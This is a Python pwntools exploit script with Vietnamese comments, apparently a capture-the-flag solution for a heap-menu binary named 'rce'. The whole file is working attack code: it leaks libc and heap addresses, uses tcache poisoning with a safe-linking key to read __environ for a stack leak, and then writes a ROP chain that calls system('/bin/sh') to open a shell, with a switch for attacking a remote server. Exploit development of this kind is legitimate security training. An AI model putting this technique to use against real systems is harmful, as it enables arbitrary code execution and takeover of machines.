#!/usr/bin/python3
from pwn import *

# ================= CẤU HÌNH =================
exe = ELF('./rce', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
context.binary = exe
context.log_level = 'debug'
# Đổi thành True nếu chạy server
REMOTE = False

if REMOTE:
    r = remote('IP_ADDRESS', 1337)
else:
    r = process('./rce')

def alloc(idx, size, data):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b'idx: ', str(idx).encode())
    r.sendlineafter(b'size: ', str(size).encode())
    r.sendafter(b'data: ', data)

def free(idx):
    r.sendlineafter(b'> ', b'2')
    r.sendlineafter(b'idx: ', str(idx).encode())
    r.recvuntil(b'ok\n')

def edit(idx, data):
    r.sendlineafter(b'> ', b'3')
    r.sendlineafter(b'idx: ', str(idx).encode())
    r.sendafter(b'data: ', data)

def print_chunk(idx):
    r.sendlineafter(b'> ', b'4')
    r.sendlineafter(b'idx: ', str(idx).encode())

info("=== STEP 1: LEAK LIBC (SPLIT ATTACK) ===")
# 1. Setup
alloc(0, 20000, b'A'*8) 
alloc(1, 256, b'B'*8)   # Guard
free(0)

# 2. Alloc size nhỏ để cắt chunk 0 -> Lộ fd pointer
alloc(2, 1, b'C') 

# 3. Print Chunk 0 cũ
print_chunk(0)

try:
    r.recvuntil(b'data: ')
    junk = r.recv(16) # Bỏ qua rác do offset
    leak_raw = r.recv(6)
    leak = u64(leak_raw.ljust(8, b'\0'))
    
    # Retry nếu alignment lệch
    if leak < 0x700000000000:
        leak_raw = r.recv(6)
        leak = u64(leak_raw.ljust(8, b'\0'))

    info(f"Raw Libc Leak: {hex(leak)}")
    
    offset_libc = 0x1d3cc0
    libc.address = leak - offset_libc
    info(f"Libc Base: {hex(libc.address)}")
except Exception as e:
    error(f"Leak Failed: {e}")

# ================= STEP 2: LEAK HEAP (DOUBLE UNSORTED) =================
info("=== STEP 2: LEAK HEAP ===")
# Tạo 2 chunk trong Unsorted Bin để chúng trỏ vào nhau
alloc(3, 20000, b'D'*8) 
alloc(4, 256, b'E'*8)   # Guard
free(3) 

alloc(5, 1, b'F') # Split Attack lên Chunk 3

print_chunk(3)
r.recvuntil(b'data: ')
junk = r.recv(16)
heap_raw = r.recv(6)
heap_leak = u64(heap_raw.ljust(8, b'\0'))

info(f"Raw Heap Leak: {hex(heap_leak)}")
heap_base = heap_leak & 0xfffffffff000
heap_key = heap_base >> 12
info(f"Calculated Heap Key: {hex(heap_key)}")

# ================= STEP 3: LEAK STACK (FIXED OFFSET) =================
info("=== STEP 3: LEAK STACK ===")
target_environ = libc.sym['__environ']
# SỬA LỖI: Trừ đi 32 bytes để obstack header không đè lên environ
# Và User Pointer sẽ trỏ đúng vào environ.
target_poison = target_environ - 32
info(f"Poisoning Tcache to: {hex(target_poison)} (Environ - 32)")

# Cần một Tcache chunk mới
alloc(6, 256, b'G'*8)
free(6)

# Poison fd
edit(6, p64(target_poison ^ heap_key))

alloc(7, 256, b'TRASH')

# Alloc Chunk 8. Nó sẽ nằm tại (Environ - 32).
# Dữ liệu người dùng bắt đầu tại (Environ - 32 + 32) = Environ!
# Gửi '\x00' để không ghi đè giá trị Stack đang có tại Environ
r.sendlineafter(b'> ', b'1')
r.sendlineafter(b'idx: ', b'8')
r.sendlineafter(b'size: ', b'256')
r.sendafter(b'data: ', b'\x00') 

print_chunk(8)
r.recvuntil(b'data: ')
# Đọc stack leak
stack_raw = r.recv(6)
stack_leak = u64(stack_raw.ljust(8, b'\0'))
info(f"Stack Leak: {hex(stack_leak)}")

# ================= STEP 4: ROP CHAIN =================
info("=== STEP 4: ROP CHAIN ===")
offset_ret = 0x120
ret_addr = stack_leak - offset_ret
info(f"Target Return Address: {hex(ret_addr)}")

# Tương tự, target ROP phải lùi 32 bytes
target_rop = ret_addr - 32

pop_rdi = libc.address + 0x00000000000277e5 
ret_gadget = pop_rdi + 1
bin_sh = next(libc.search(b'/bin/sh'))
system_addr = libc.sym['system']

# Poison Tcache lần 2
alloc(9, 256, b'H'*8)
free(9)
edit(9, p64(target_rop ^ heap_key))

alloc(10, 256, b'TRASH')

# Ghi ROP Chain
rop_chain = p64(pop_rdi) + p64(bin_sh) + p64(ret_gadget) + p64(system_addr)
# Alloc chunk 11 tại RetAddr. Ghi thẳng payload vào.
alloc(11, 256, rop_chain)

# Trigger
r.sendlineafter(b'> ', b'0')
r.interactive()